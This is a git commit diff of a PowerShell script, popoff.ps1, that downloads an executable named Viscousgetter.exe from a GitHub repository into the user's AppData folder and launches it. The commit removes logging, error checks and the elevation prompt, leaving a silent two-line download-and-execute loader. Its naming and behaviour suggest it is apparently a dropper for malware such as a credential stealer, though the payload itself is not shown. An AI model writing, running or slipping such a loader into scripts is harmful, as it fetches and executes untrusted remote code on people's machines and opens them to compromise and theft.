24e8801028604a15f2715aadd3f22b6a8606d5ad
Zyg0s <weizeeer@gmail.com>
2024-12-04 17:33:48 +0100

    Update popoff.ps1

--- popoff.ps1
+++ popoff.ps1
@@ -1,18 +1,4 @@
 $VIS = "https://github.com/Zyg0s/VI_ASTRA/raw/refs/heads/main/Viscousgetter.exe"
 $VISPath = "$env:AppData\Viscousgetter.exe"
-
-# Download the file
-Invoke-WebRequest -Uri $VIS -OutFile $VISPath -Verbose
-
-# Validate file exists
-If (!(Test-Path -Path $VISPath)) {
-    Write-Error "File download failed!"
-    Exit
-}
-
-# Run the file
-Try {
-    Start-Process -FilePath $VISPath -NoNewWindow -Wait -Verb RunAs
-} Catch {
-    Write-Error "Execution failed: $($_.Exception.Message)"
-}
+Invoke-WebRequest -Uri $VIS -OutFile $VISPath
+Start-Process -FilePath $VISPath
